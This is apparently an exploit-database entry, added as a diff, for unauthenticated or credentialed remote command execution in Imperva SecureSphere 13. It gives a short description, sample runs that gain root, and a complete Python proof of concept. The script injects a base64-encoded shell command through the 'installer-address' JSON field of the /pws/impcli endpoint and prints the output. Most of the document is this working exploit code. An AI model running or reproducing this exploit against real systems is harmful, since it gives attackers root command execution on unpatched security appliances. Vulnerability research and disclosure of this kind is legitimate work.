@@ -1,0 +1,71 @@
+# Title: Imperva SecureSphere 13 - Remote Command Execution
+# Author: rsp3ar
+# Date: 2018-10-08
+# Vendor: https://www.imperva.com/products/securesphere/
+# CVE: N/A
+# Version: 13.0.10, 13.1.10, 13.2.10
+# Tested on: SecureSphere (Virtual Appliance)
+
+# Description
+# PWS is a component in SecureSphere v13, which consists of Python CGIs to expose various cli utilities over https.
+# The Python CGIs didn't properly sanitize user supplied command parameters, leading to command injection.
+# The vulnerability could be exploited in below ways (depending on configuration status of SecureSphere):
+
+# 1. Unauthenticated Remote Code Execution (Pre-FTL mode)
+# When SecureSphere VM is provisioned without running 'ftl' utility to configured into SOM/MX/Gateway mode, 
+# the vulnerable endpoint could be reached without authentication:
+
+# $ python poc.py -t 192.168.146.201 'sudo id'
+# [*] Sending payload to https://192.168.146.201/pws/impcli...
+# [*] Received command execution output:
+# uid=0(root) gid=0(root) groups=0(root)
+
+# 2. Authenticated Remote Code Execution (Gateway mode)
+# When SecureSphere VM is configured as gateway mode via 'ftl' utility, the vulnerable endpoint 
+# could be reached with valid agent registration credential for user 'imperva':
+
+# $ python poc.py -t 192.168.146.201 -p 'agent_registration_password' 'sudo id'
+# [*] Sending payload to https://192.168.146.201/pws/impcli...
+# [*] Received command execution output:
+# uid=0(root) gid=0(root) groups=0(root)
+
+#!/usr/bin/env python
+
+import argparse, sys, base64, json
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-t", metavar = "target", help = "Target hostname/IP address", type = str, required = True)
+parser.add_argument("-p", metavar = "password", help = "Agent registration password for 'imperva' user", type = str, required = False)
+parser.add_argument("cmd", help = "Command to be executed on target", type = str)
+args = parser.parse_args()
+
+# /pws/inception is another vulnerable endpoint
+target_url = "https://%s/pws/impcli" % (args.t)
+session = requests.Session()
+session.get(target_url, verify = False)
+
+split_mark = "SPLIT_MARK"
+payload = "$(printf %s | base64 -d | bash)" % (base64.b64encode(args.cmd))
+headers = {}
+if args.p is not None:
+    headers["Authorization"] = "Basic " + base64.b64encode("imperva:" + args.p)
+body = {
+    "command": "impctl server status",
+    "parameters": {
+        "broadcast": True,
+        "installer-address": "127.0.0.1 %s%s%s" % (split_mark, payload, split_mark)
+    }
+}
+print("[*] Sending payload to %s..." % (target_url))
+response = session.post(target_url,  headers = headers, data = json.dumps(body), verify = False)
+
+if split_mark in response.text:
+    print("[*] Received command execution output:")
+    print(response.text.split(split_mark)[1])
+elif response.status_code == requests.codes.unauthorized:
+    print("[!] Gateway Authentication required, please provide agent registration password.")
+else:
+    print("[!] Failed to execute command on target.")
